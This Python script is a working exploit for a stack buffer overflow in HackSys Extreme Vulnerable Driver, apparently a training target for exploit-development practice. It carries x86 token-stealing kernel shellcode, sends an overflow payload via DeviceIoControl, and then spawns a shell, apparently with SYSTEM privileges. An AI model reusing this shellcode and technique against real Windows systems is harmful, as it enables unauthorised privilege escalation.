import struct, sys
from ctypes import *
import subprocess

# API Constants 
Generic_Read = 0x80000000
Generic_Write = 0x40000000
OPEN_EXISTING = 0x3
FILE_DEVICE_UNKNOWN = 0x00000022
FILE_ANY_ACCESS = 0x00000000
METHOD_NEITHER = 0x00000003
MEM_COMMIT = 0x00001000
MEM_RESERVE = 0x00002000
PAGE_EXECUTE_READWRITE = 0x00000040

kernel32 = windll.kernel32

# Step1: Get device handle
def get_driver_handle():
    '''
    We need to establish a handle to our kernel-mode driver, this can be performed through our fine 
    API _CreateFileA_ which creates or open a file or I/O device with the specified access, and I/O Flags.
    HANDLE CreateFileA(
    LPCSTR                lpFileName, 
    DWORD                 dwDesiredAccess,
    DWORD                 dwShareMode,
    LPSECURITY_ATTRIBUTES lpSecurityAttributes,
    DWORD                 dwCreationDisposition,
    DWORD                 dwFlagsAndAttributes,
    HANDLE                hTemplateFile
    );
    '''

    # API Setup
    device_name = c_char_p(b"\\\\.\\HackSysExtremeVulnerableDriver") # Driver Name
    dwDesiredAccess = (Generic_Read | Generic_Write) # 0xc0000000
    dwShareMode = 0 # Not shared.
    lpSecAttrib = None # No pointer to security attributes. 
    dwCreationDisposition = OPEN_EXISTING # Opens a file or device, only if it exists.
    dwFlagsAndAttributes = None # None required
    hTemplateFile = None # When opening an existing file, CreateFile ignores this parameter.

    print("[*] Trying to obtain HEVD handle")
    # API Call
    driver_handle = kernel32.CreateFileA(device_name, dwDesiredAccess, dwShareMode, lpSecAttrib, dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile)

    # Check whether handle is obtained
    if not driver_handle or driver_handle == -1:
        print("[-] Failed to get driver handle: " + FormatError())
        sys.exit()
    print("[+] Received Device Handle: 0x%x " %driver_handle)
    return driver_handle

def stack_buffer_overflow(hevd):

    shellcode = b''
    shellcode += (
    b"\x60"                            # pushad
    b"\x31\xc0"                        # xor eax,eax
    b"\x64\x8b\x80\x24\x01\x00\x00"    # mov eax,[fs:eax+0x124]
    b"\x8b\x40\x50"                    # mov eax,[eax+0x50]
    b"\x89\xc1"                        # mov ecx,eax
    b"\xba\x04\x00\x00\x00"            # mov edx,0x4
    b"\x8b\x80\xb8\x00\x00\x00"        # mov eax,[eax+0xb8]
    b"\x2d\xb8\x00\x00\x00"            # sub eax,0xb8
    b"\x39\x90\xb4\x00\x00\x00"        # cmp [eax+0xb4],edx
    b"\x75\xed"                        # jnz 0x1a
    b"\x8b\x90\xf8\x00\x00\x00"        # mov edx,[eax+0xf8]
    b"\x89\x91\xf8\x00\x00\x00"        # mov [ecx+0xf8],edx
    b"\x61"                            # popad
    ### RECOVERY
    b"\x8b\xc8"			               # mov     ecx, eax
	b"\x8b\xc1"           			   # mov     eax, ecx
	b"\x5d"                            # pop ebp
	b"\xc2\x08\x00"                    # ret 0x8
)

    print("[*] Calling VirtualAlloc")
    ptr = kernel32.VirtualAlloc(c_int(0),c_int(len(shellcode)),c_int(0x3000),c_int(0x40))
    print("[+] Memory allocated at address = 0x%x" %ptr)
    buff = (c_char * len(shellcode)).from_buffer_copy(shellcode)
    print("[*] Calling RtlMoveMemory")
    kernel32.RtlMoveMemory(c_int(ptr), buff, c_int(len(shellcode)))
    shellcode_final = struct.pack("<L",ptr)

    junk1     = b'A' * 2080
    buf = create_string_buffer(junk1 + shellcode_final)

    print("[*] Exploiting Stack Buffer Overflow")

    result = kernel32.DeviceIoControl(hevd, 0x222003, addressof(buf), (len(buf)-1), None, 0, byref(c_ulong()), None)

    if result != 0:
        print("[*] Sending payload to driver...")
    else:
        print("[!] Unable to send payload to driver.")
        sys.exit(1)

    subprocess.Popen("start cmd", shell=True)

def main():
	hevd = get_driver_handle()
	stack_buffer_overflow(hevd)



if __name__ == "__main__":
	main()